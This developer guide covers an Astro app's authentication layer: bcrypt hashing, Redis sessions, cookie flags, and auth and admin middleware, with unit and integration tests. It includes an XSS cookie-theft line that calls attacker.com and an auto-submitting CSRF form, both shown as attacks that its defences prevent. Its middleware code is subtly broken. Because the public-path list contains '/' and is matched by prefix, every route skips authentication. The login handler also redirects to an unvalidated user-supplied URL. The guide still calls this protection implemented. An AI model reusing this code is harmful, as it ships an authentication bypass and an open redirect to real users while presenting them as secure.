# Phase 2: Authentication & Sessions (T018-T021)

## Overview

This phase implements the core authentication system: password hashing with bcrypt, Redis-based session management, and middleware for protecting routes. This foundation enables secure user login, logout, and authorization throughout the application.

---

## T018: Password Hashing with bcrypt

### File: `src/lib/auth/password.ts`

### Why bcrypt?

**Comparison of hashing methods:**

```typescript
// ❌ Plaintext (Never!)
password: 'mypassword123'
// Anyone with database access sees passwords

// ❌ MD5/SHA1 (Fast = Bad for passwords)
password: md5('mypassword123')  // Same hash every time
// Rainbow tables can crack in seconds

// ✅ bcrypt (Slow = Good for passwords)
password: bcrypt.hash('mypassword123', 10)
// Each hash is unique (salted)
// Computationally expensive (prevents brute force)
```

### bcrypt Features

**1. Automatic Salting**
```typescript
const hash1 = await hashPassword('password123');
const hash2 = await hashPassword('password123');

console.log(hash1);
// $2b$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy

console.log(hash2);
// $2b$10$K7pX3uRv8qT2YwNzXaKgOu5jQ8vW6rL9mH3dS2fG4hI5jK6lM7nO8p

// Same password, different hashes!
```

**Why this matters:**
- Prevents rainbow table attacks
- Two users with same password have different hashes
- Can't identify duplicate passwords in database

**2. Cost Factor (Work Factor)**
```typescript
const SALT_ROUNDS = 10;  // 2^10 = 1024 iterations
await bcrypt.hash(password, SALT_ROUNDS);
```

**Performance vs Security:**
```
Rounds | Time   | Security
-------|--------|----------
4      | 0.5ms  | Weak (2^4 = 16 iterations)
8      | 8ms    | Moderate
10     | 100ms  | Good ✅ (default)
12     | 400ms  | Strong
14     | 1.6s   | Very strong
16     | 6.4s   | Overkill
```

**Recommendation:** 10 rounds
- Fast enough for login (<100ms)
- Slow enough to prevent brute force
- Can adjust via environment variable

**3. Timing-Safe Verification**
```typescript
const isValid = await bcrypt.compare(password, hash);
```

**Why timing-safe matters:**
```typescript
// ❌ Timing attack vulnerable
function verifyPassword(input, correct) {
  for (let i = 0; i < input.length; i++) {
    if (input[i] !== correct[i]) {
      return false;  // Exits early if character doesn't match
    }
  }
  return true;
}
// Attacker measures response time to guess password character by character

// ✅ bcrypt.compare() is timing-safe
// Takes same time regardless of how many characters match
```

### Password Utilities

**Password Strength Validation:**
```typescript
const validation = validatePasswordStrength('weak');
// { isValid: false, message: 'Password must be at least 8 characters' }

const validation = validatePasswordStrength('StrongPass123!');
// { isValid: true, message: 'Password is strong' }
```

**Requirements enforced:**
- Minimum 8 characters
- At least one uppercase letter
- At least one lowercase letter
- At least one number
- At least one special character

**Secure Password Generation:**
```typescript
const tempPassword = generateSecurePassword(16);
// 'aK7$mN9!pQ2#xR5@'

// Useful for:
// - Temporary passwords (password reset)
// - Admin-generated accounts
// - API keys
```

---

## T019: Redis Session Management

### File: `src/lib/auth/session.ts`

### Why Redis for Sessions?

**Comparison of session storage methods:**

**1. Memory (Node.js process)**
```typescript
// ❌ Problems:
// - Lost on server restart
// - Doesn't work with multiple servers (load balancing)
// - Memory leaks if not cleaned up
```

**2. Database (PostgreSQL)**
```typescript
// ⚠️ Problems:
// - Slow (disk I/O for every request)
// - Adds load to database
// - Still need cleanup logic
```

**3. JWT Tokens (Stateless)**
```typescript
// ⚠️ Problems:
// - Can't revoke (logout doesn't work until expiry)
// - Larger cookie size (entire payload in cookie)
// - Security issues if stolen (can't invalidate)
```

**4. Redis (Best for sessions) ✅**
```typescript
// ✓ Benefits:
// - Fast (<1ms read/write)
// - In-memory (no disk I/O)
// - Auto-expiration (TTL)
// - Can revoke immediately (logout)
// - Works with multiple servers
// - Built-in persistence (optional)
```

### Session Data Structure

```typescript
interface SessionData {
  userId: string;        // Who is logged in
  email: string;         // User email
  name: string;          // Display name
  role: 'admin' | 'user'; // Authorization level
  createdAt: number;     // When session created
  lastActivity: number;  // Last request time
}
```

### Session Flow

**1. Create Session (Login)**
```typescript
// User logs in
const sessionId = await createSession(
  user.id,
  user.email,
  user.name,
  user.role
);

// Store in Redis
// Key: session:a3f5b2c1d4e6f7a8...
// Value: { userId: '123', email: 'user@example.com', ... }
// TTL: 86400 seconds (24 hours)

// Set cookie
cookies.set('sid', sessionId, {
  httpOnly: true,     // JavaScript can't access
  secure: true,       // HTTPS only (production)
  sameSite: 'lax',    // CSRF protection
  maxAge: 86400,      // 24 hours
  path: '/',          // Site-wide
});
```

**2. Get Session (Protected Route)**
```typescript
// Read cookie
const sessionId = cookies.get('sid')?.value;

// Lookup in Redis
const session = await getSession(sessionId);
// Returns: { userId: '123', email: 'user@example.com', ... }

if (!session) {
  // Session expired or invalid
  return Astro.redirect('/login');
}

// Use session data
const userName = session.name;
```

**3. Destroy Session (Logout)**
```typescript
// Get session ID from cookie
const sessionId = cookies.get('sid')?.value;

// Delete from Redis
await destroySession(sessionId);

// Clear cookie
cookies.delete('sid');

// Redirect to login
return Astro.redirect('/login');
```

### Session Security Features

**1. Cryptographically Secure Session IDs**
```typescript
function generateSessionId(): string {
  return randomBytes(32).toString('hex');  // 64 hex characters
}

// Example output:
// "a3f5b2c1d4e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2"

// 2^256 possible values (impossible to guess)
```

**2. HTTP-Only Cookies**
```typescript
cookies.set('sid', sessionId, {
  httpOnly: true,  // JavaScript can't access via document.cookie
});
```

**Attack prevented:**
```html
<!-- Attacker injects XSS -->
<script>
  // Try to steal session cookie
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
  // ❌ Fails! httpOnly cookies not accessible
</script>
```

**3. Secure Cookies (HTTPS Only)**
```typescript
cookies.set('sid', sessionId, {
  secure: process.env.NODE_ENV === 'production',
});
```

**Attack prevented:**
- Without `secure`: Cookie sent over HTTP (attacker on WiFi can intercept)
- With `secure`: Cookie only sent over HTTPS (encrypted)

**4. SameSite Protection**
```typescript
cookies.set('sid', sessionId, {
  sameSite: 'lax',
});
```

**CSRF attack prevented:**
```html
<!-- Attacker's site: evil.com -->
<form action="https://yoursite.com/api/transfer-money" method="POST">
  <input name="amount" value="1000000" />
  <input name="to" value="attacker-account" />
</form>
<script>document.forms[0].submit();</script>

<!-- Without SameSite: Cookie sent, money transferred! ❌ -->
<!-- With SameSite: Cookie NOT sent, request fails ✅ -->
```

**SameSite values:**
- `strict`: Never sent with cross-site requests (most secure, breaks some flows)
- `lax`: Sent with top-level navigation (GET), not cross-site POST (balanced) ✅
- `none`: Always sent (requires `secure: true`, not recommended)

### Session Management Features

**Auto-Expiration:**
```typescript
// TTL set in Redis
await setJSON(sessionKey, sessionData, 86400);  // 24 hours

// Redis automatically deletes expired sessions
// No cleanup code needed!
```

**Activity Update:**
```typescript
export async function getSession(sessionId: string) {
  const sessionData = await getJSON<SessionData>(sessionKey);
  
  // Update last activity timestamp
  sessionData.lastActivity = Date.now();
  
  // Reset TTL (sliding window)
  await setJSON(sessionKey, sessionData, SESSION_TTL);
  
  return sessionData;
}
```

**Sliding Window Expiration:**
```
User logs in at 12:00 PM (session expires at 12:00 AM)
User makes request at 11:00 PM (session expires at 11:00 PM next day)
User makes request at 10:00 PM next day (session expires at 10:00 PM following day)
// Session stays alive as long as user is active
```

---

## T020: Authentication Middleware

### File: `src/middleware/auth.ts`

### What is Middleware?

**Middleware runs before page renders:**
```
Request → Middleware → Page → Response
             ↓
       Check authentication
       Redirect if not logged in
       Add user to context
```

### Authentication Flow

```typescript
export const onRequest = defineMiddleware(async (context, next) => {
  const { url, cookies, redirect, locals } = context;

  // 1. Define public paths (no auth required)
  const publicPaths = ['/', '/login', '/register', '/forgot-password'];
  
  // 2. Check if current path is public
  const isPublicPath = publicPaths.some(path => 
    url.pathname.startsWith(path)
  );
  
  // 3. Skip auth for public paths
  if (isPublicPath) {
    return next();  // Continue to page
  }
  
  // 4. Get session from cookie
  const session = await getSessionFromRequest(cookies);
  
  // 5. If no session, redirect to login
  if (!session) {
    const redirectUrl = new URL('/login', url.origin);
    redirectUrl.searchParams.set('redirect', url.pathname);  // Save intended destination
    return redirect(redirectUrl.toString());
  }
  
  // 6. Attach session to locals (available in pages)
  locals.session = session;
  locals.user = {
    id: session.userId,
    email: session.email,
    name: session.name,
    role: session.role,
  };
  
  // 7. Continue to page
  return next();
});
```

### Redirect Preservation

**Problem without redirect parameter:**
```
User tries to access: /dashboard/courses
Not logged in: Redirected to /login
User logs in: Goes to /dashboard (wrong!)
User has to navigate to /dashboard/courses again
```

**Solution with redirect parameter:**
```
User tries to access: /dashboard/courses
Not logged in: Redirected to /login?redirect=/dashboard/courses
User logs in: Redirected to /dashboard/courses ✅
```

**Implementation:**
```astro
---
// login.astro
const redirect = Astro.url.searchParams.get('redirect') || '/dashboard';
---

<form method="POST" action="/api/auth/login">
  <input type="hidden" name="redirect" value={redirect} />
  <!-- Login fields -->
</form>
```

```typescript
// /api/auth/login.ts
const redirect = formData.get('redirect')?.toString() || '/dashboard';
return new Response(null, {
  status: 302,
  headers: { Location: redirect }
});
```

### Using Session in Pages

```astro
---
// src/pages/dashboard/index.astro
export const prerender = false;

// Session automatically attached by middleware
const user = Astro.locals.user;
---

<h1>Welcome, {user.name}!</h1>
<p>Email: {user.email}</p>
<p>Role: {user.role}</p>
```

---

## T021: Admin Middleware

### File: `src/middleware/admin.ts`

### Admin Authorization Flow

```typescript
export const onRequest = defineMiddleware(async (context, next) => {
  const { url, cookies, redirect } = context;

  // 1. Only apply to admin routes
  if (!url.pathname.startsWith('/admin')) {
    return next();
  }

  // 2. Get session
  const session = await getSessionFromRequest(cookies);

  // 3. Not logged in → redirect to login
  if (!session) {
    return redirect('/login?redirect=/admin&error=admin_auth_required');
  }

  // 4. Not admin → redirect to home
  if (session.role !== 'admin') {
    return redirect('/?error=admin_access_denied');
  }

  // 5. Is admin → continue
  return next();
});
```

### Two-Level Security

**Level 1: Authentication (T020)**
```typescript
// Are you logged in?
if (!session) {
  return redirect('/login');
}
```

**Level 2: Authorization (T021)**
```typescript
// Are you an admin?
if (session.role !== 'admin') {
  return redirect('/?error=access_denied');
}
```

**Example flow:**
```
/admin/courses
  ↓
Auth Middleware: Check if logged in ✓
  ↓
Admin Middleware: Check if admin ✓
  ↓
Page renders
```

### Role-Based Access Control (RBAC)

**Database schema:**
```sql
CREATE TYPE user_role AS ENUM ('admin', 'user');

CREATE TABLE users (
  id UUID PRIMARY KEY,
  email VARCHAR(255) UNIQUE NOT NULL,
  role user_role DEFAULT 'user'
);
```

**Session includes role:**
```typescript
interface SessionData {
  userId: string;
  role: 'admin' | 'user';  // Stored in session
}
```

**Protected routes:**
```
/dashboard/*          → Requires: logged in
/dashboard/profile    → Requires: logged in
/admin/*              → Requires: logged in + admin role
```

### Error Messages

**Different errors for different scenarios:**
```typescript
// Not logged in
?error=admin_auth_required
// "You must be logged in to access admin features"

// Logged in but not admin
?error=admin_access_denied  
// "You don't have permission to access admin features"
```

**Why different messages?**
- Helps user understand the issue
- Not logged in: Show login button
- Not admin: Show "contact administrator" message

---

## Security Checklist

### ✅ Implemented

**Password Security:**
- ✅ bcrypt hashing (10+ rounds)
- ✅ Salting (automatic in bcrypt)
- ✅ Timing-safe comparison
- ✅ Password strength validation

**Session Security:**
- ✅ Cryptographically secure session IDs (32 bytes)
- ✅ HTTP-only cookies (XSS protection)
- ✅ Secure cookies (HTTPS only in production)
- ✅ SameSite cookies (CSRF protection)
- ✅ TTL expiration (24 hours)
- ✅ Immediate logout (destroy session)

**Authorization:**
- ✅ Middleware-based protection
- ✅ Role-based access control
- ✅ Redirect preservation
- ✅ Public path allowlist

### 🔄 Future Enhancements

**Rate Limiting:**
```typescript
// Prevent brute force login attempts
const attempts = await redis.incr(`login_attempts:${email}`);
if (attempts > 5) {
  return error('Too many login attempts. Try again in 1 hour.');
}
```

**Session Rotation:**
```typescript
// Generate new session ID after login
// Prevents session fixation attacks
async function rotateSession(oldSessionId: string) {
  const data = await getSession(oldSessionId);
  await destroySession(oldSessionId);
  return await createSession(data.userId, data.email, data.name, data.role);
}
```

**Two-Factor Authentication:**
```typescript
// After password verification
if (user.twoFactorEnabled) {
  // Create temporary session
  await redis.setEx(`2fa_pending:${tempId}`, 300, user.id);
  return redirect(`/auth/2fa?session=${tempId}`);
}
```

---

## Complete Authentication Flow

### Registration → Login → Protected Page

```
1. User registers (POST /api/auth/register)
   ↓
2. Password hashed with bcrypt
   ↓
3. User stored in database
   ↓
4. Redirect to login
   ↓
5. User logs in (POST /api/auth/login)
   ↓
6. Password verified with bcrypt.compare()
   ↓
7. Session created in Redis
   ↓
8. Session cookie set (HTTP-only, secure, sameSite)
   ↓
9. Redirect to dashboard
   ↓
10. Request to /dashboard
    ↓
11. Auth middleware checks cookie
    ↓
12. Session lookup in Redis
    ↓
13. Session attached to Astro.locals
    ↓
14. Page renders with user data
    ↓
15. User clicks logout
    ↓
16. Session deleted from Redis
    ↓
17. Cookie deleted
    ↓
18. Redirect to login
```

---

## Testing Strategy

### Unit Tests

```typescript
describe('Password Hashing', () => {
  it('should hash password', async () => {
    const hash = await hashPassword('password123');
    expect(hash).toMatch(/^\$2b\$/);  // bcrypt signature
    expect(hash).not.toBe('password123');
  });

  it('should verify correct password', async () => {
    const hash = await hashPassword('password123');
    const isValid = await verifyPassword('password123', hash);
    expect(isValid).toBe(true);
  });

  it('should reject incorrect password', async () => {
    const hash = await hashPassword('password123');
    const isValid = await verifyPassword('wrongpassword', hash);
    expect(isValid).toBe(false);
  });
});

describe('Session Management', () => {
  it('should create session', async () => {
    const sessionId = await createSession('user-123', 'user@example.com', 'User', 'user');
    expect(sessionId).toHaveLength(64);
    
    const session = await getSession(sessionId);
    expect(session.userId).toBe('user-123');
  });

  it('should destroy session', async () => {
    const sessionId = await createSession('user-123', 'user@example.com', 'User', 'user');
    await destroySession(sessionId);
    
    const session = await getSession(sessionId);
    expect(session).toBeNull();
  });
});
```

### Integration Tests

```typescript
describe('Authentication Flow', () => {
  it('should login and access protected page', async () => {
    // Login
    const response = await POST('/api/auth/login', {
      email: 'user@example.com',
      password: 'password123'
    });
    
    const cookies = response.headers.get('set-cookie');
    expect(cookies).toContain('sid=');
    
    // Access protected page
    const dashboardResponse = await GET('/dashboard', { headers: { Cookie: cookies } });
    expect(dashboardResponse.status).toBe(200);
  });

  it('should redirect to login if not authenticated', async () => {
    const response = await GET('/dashboard');
    expect(response.status).toBe(302);
    expect(response.headers.get('location')).toContain('/login');
  });
});
```

---

## Key Takeaways

1. **bcrypt for Passwords** - Slow hashing prevents brute force attacks
2. **Redis for Sessions** - Fast, scalable, auto-expiring session storage
3. **Secure Cookies** - httpOnly, secure, sameSite protect against XSS/CSRF
4. **Middleware Protection** - Automatic auth checks before page rendering
5. **Role-Based Access** - Admin middleware for authorization
6. **Redirect Preservation** - Better UX after login

---

**Related Files:**
- [src/lib/auth/password.ts](/home/dan/web/src/lib/auth/password.ts)
- [src/lib/auth/session.ts](/home/dan/web/src/lib/auth/session.ts)
- [src/middleware/auth.ts](/home/dan/web/src/middleware/auth.ts)
- [src/middleware/admin.ts](/home/dan/web/src/middleware/admin.ts)

**Previous Guide:** [Database & Caching (T013-T017)](./phase2-database-redis.md)
**Next Guide:** [Layouts & Error Handling (T022-T028)](./phase2-layouts-errors.md)
